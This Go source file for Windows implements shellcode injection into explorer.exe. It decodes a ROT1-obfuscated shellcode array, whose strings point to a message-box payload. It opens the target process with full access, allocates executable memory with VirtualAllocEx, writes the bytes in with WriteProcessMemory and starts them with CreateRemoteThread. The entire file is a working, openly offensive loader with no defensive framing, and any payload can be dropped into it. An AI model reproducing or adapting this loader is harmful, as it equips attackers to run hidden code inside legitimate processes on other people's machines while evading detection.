package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ROT1 encoded shellcode
var encodedShellcode = []byte{0xFD, 0x49, 0x82, 0xE5, 0xF1, 0x0, 0x0, 0x0, 0xE9, 0xD1, 0x1, 0x1, 0x1, 0x42, 0x52, 0x42, 0x51, 0x53, 0x52, 0x57, 0x49, 0x32, 0xD3, 0x66, 0x49, 0x8C, 0x53, 0x61, 0x3F, 0x49, 0x8C, 0x53, 0x19, 0x3F, 0x49, 0x8C, 0x53, 0x21, 0x3F, 0x49, 0x8C, 0x73, 0x51, 0x3F, 0x49, 0x10, 0xB8, 0x4B, 0x4B, 0x4E, 0x32, 0xCA, 0x49, 0x32, 0xC1, 0xAD, 0x3D, 0x62, 0x7D, 0x3, 0x2D, 0x21, 0x42, 0xC2, 0xCA, 0xE, 0x42, 0x2, 0xC2, 0xE3, 0xEE, 0x53, 0x42, 0x52, 0x3F, 0x49, 0x8C, 0x53, 0x21, 0x3F, 0x8C, 0x43, 0x3D, 0x49, 0x2, 0xD1, 0x3F, 0x8C, 0x81, 0x89, 0x1, 0x1, 0x1, 0x49, 0x86, 0xC1, 0x75, 0x70, 0x49, 0x2, 0xD1, 0x51, 0x3F, 0x8C, 0x49, 0x19, 0x3F, 0x45, 0x8C, 0x41, 0x21, 0x4A, 0x2, 0xD1, 0xE4, 0x5D, 0x49, 0x0, 0xCA, 0x3F, 0x42, 0x8C, 0x35, 0x89, 0x49, 0x2, 0xD7, 0x4E, 0x32, 0xCA, 0x49, 0x32, 0xC1, 0xAD, 0x42, 0xC2, 0xCA, 0xE, 0x42, 0x2, 0xC2, 0x39, 0xE1, 0x76, 0xF2, 0x3F, 0x4D, 0x4, 0x4D, 0x25, 0x9, 0x46, 0x3A, 0xD2, 0x76, 0xD7, 0x59, 0x3F, 0x45, 0x8C, 0x41, 0x25, 0x4A, 0x2, 0xD1, 0x67, 0x3F, 0x42, 0x8C, 0xD, 0x49, 0x3F, 0x45, 0x8C, 0x41, 0x1D, 0x4A, 0x2, 0xD1, 0x3F, 0x42, 0x8C, 0x5, 0x89, 0x49, 0x2, 0xD1, 0x42, 0x59, 0x42, 0x59, 0x5F, 0x5A, 0x5B, 0x42, 0x59, 0x42, 0x5A, 0x42, 0x5B, 0x49, 0x84, 0xED, 0x21, 0x42, 0x53, 0x0, 0xE1, 0x59, 0x42, 0x5A, 0x5B, 0x3F, 0x49, 0x8C, 0x13, 0xEA, 0x4A, 0x0, 0x0, 0x0, 0x5E, 0x3F, 0x49, 0x8E, 0x8E, 0x28, 0x2, 0x1, 0x1, 0x42, 0xBB, 0x4D, 0x78, 0x27, 0x8, 0x0, 0xD6, 0x4A, 0xC8, 0xC2, 0x1, 0x1, 0x1, 0x1, 0x3F, 0x49, 0x8E, 0x96, 0xF, 0x2, 0x1, 0x1, 0x3F, 0x4D, 0x8E, 0x86, 0x1D, 0x2, 0x1, 0x1, 0x49, 0x32, 0xCA, 0x42, 0xBB, 0x46, 0x84, 0x57, 0x8, 0x0, 0xD6, 0x49, 0x32, 0xCA, 0x42, 0xBB, 0xF1, 0xB6, 0xA3, 0x57, 0x0, 0xD6, 0x74, 0x69, 0x66, 0x6D, 0x6D, 0x64, 0x70, 0x65, 0x66, 0x21, 0x73, 0x76, 0x6F, 0x1, 0x4E, 0x66, 0x74, 0x74, 0x62, 0x68, 0x66, 0x43, 0x70, 0x79, 0x1, 0x76, 0x74, 0x66, 0x73, 0x34, 0x33, 0x2F, 0x65, 0x6D, 0x6D, 0x1, 0x1, 0x69, 0x42, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x81, 0x42, 0x1, 0x1, 0x1, 0x31, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x8F, 0x42, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x9F, 0x42, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x4C, 0x46, 0x53, 0x4F, 0x46, 0x4D, 0x34, 0x33, 0x2F, 0x65, 0x6D, 0x6D, 0x1, 0x1, 0x59, 0x5, 0x57, 0x6A, 0x73, 0x75, 0x76, 0x62, 0x6D, 0x42, 0x6D, 0x6D, 0x70, 0x64, 0x1, 0x1, 0x6, 0x2, 0x46, 0x79, 0x6A, 0x75, 0x51, 0x73, 0x70, 0x64, 0x66, 0x74, 0x74, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x9, 0x1, 0x1, 0x1}

// Target process name
const targetProcessName = "explorer.exe"

// Define the PROCESS_ALL_ACCESS constant manually, beacause it's not defined in the x/sys/windows package
const PROCESS_ALL_ACCESS = 0x1F0FFF

// FindProcessByName finds a process by its name and returns its handle.
func findProcessByName(processName string) (windows.Handle, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("failed to create process snapshot: %v", err)
	}
	defer windows.CloseHandle(snapshot)

	var processEntry windows.ProcessEntry32
	processEntry.Size = uint32(unsafe.Sizeof(processEntry))

	// Iterate over processes in the snapshot
	for {
		err = windows.Process32Next(snapshot, &processEntry)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				break
			}
			return 0, fmt.Errorf("failed to get next process: %v", err)
		}

		processNameUTF16 := syscall.UTF16ToString(processEntry.ExeFile[:])
		if processNameUTF16 == processName {
			// Open process with required permissions to add a thread a to it
			handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, processEntry.ProcessID)
			if err != nil {
				return 0, fmt.Errorf("failed to open process %s: %v", processName, err)
			}
			return handle, nil
		}
	}
	return 0, fmt.Errorf("process %s not found", processName)
}

func main() {
	// Decrypt the shellcode
	for i := 0; i < len(encodedShellcode); i++ {
		encodedShellcode[i] = encodedShellcode[i] - 1
	}

	// Find the target process by name
	processHandle, err := findProcessByName(targetProcessName)
	if err != nil {
		fmt.Printf("Error finding process: %v\n", err)
		return
	}
	defer windows.CloseHandle(processHandle)

	// Step 1: Allocate memory in the remote process using VirtualAllocEx
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")

	// Call VirtualAllocEx to allocate memory in the target process
	addr, _, err := VirtualAllocEx.Call(
		uintptr(processHandle),
		0,                                      // NULL address, let the system choose
		uintptr(len(encodedShellcode)),         // Size of the memory to allocate
		windows.MEM_COMMIT|windows.MEM_RESERVE, // Memory type
		windows.PAGE_EXECUTE_READWRITE,         // Memory protection
	)

	if addr == 0 {
		fmt.Printf("VirtualAllocEx failed: %v\n", err)
		return
	}
	fmt.Printf("Memory allocated at address: 0x%X\n", addr)

	// Step 2: Write the shellcode into the allocated memory using WriteProcessMemory
	var numBytesWritten uintptr
	err = windows.WriteProcessMemory(
		processHandle,
		addr,
		&encodedShellcode[0],
		uintptr(len(encodedShellcode)),
		&numBytesWritten,
	)

	if err != nil {
		fmt.Printf("WriteProcessMemory failed: %v\n", err)
		return
	}

	// Step 3: Create a remote thread in the remote process to execute the shellcode
	CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
	_, _, err = CreateRemoteThread.Call(
		uintptr(processHandle),
		0,
		0,
		addr,
		0,
		0,
		0,
	)

	if err != nil {
		return
	}

	fmt.Println("Shellcode injected and executed successfully.")
}